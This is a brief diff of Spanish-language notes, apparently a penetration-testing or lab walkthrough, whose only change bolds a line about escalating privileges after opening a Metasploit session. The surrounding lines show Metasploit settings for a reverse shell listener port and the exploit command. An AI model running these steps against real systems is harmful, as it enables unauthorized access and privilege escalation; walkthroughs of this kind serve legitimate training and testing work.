@@ -29,7 +29,7 @@ para tener shell con metaexploit
 # set lport 60001
 # exploit
 
-Una vez tengamos la session creada de metaexploit haremos lo siguiente para escalar privilegio
+**Una vez tengamos la session creada de metaexploit haremos lo siguiente para escalar privilegio**
 
 # Crtl+Z 
 # y (esto es para volver a metaexploit y dejamos en backgroup la session 1)
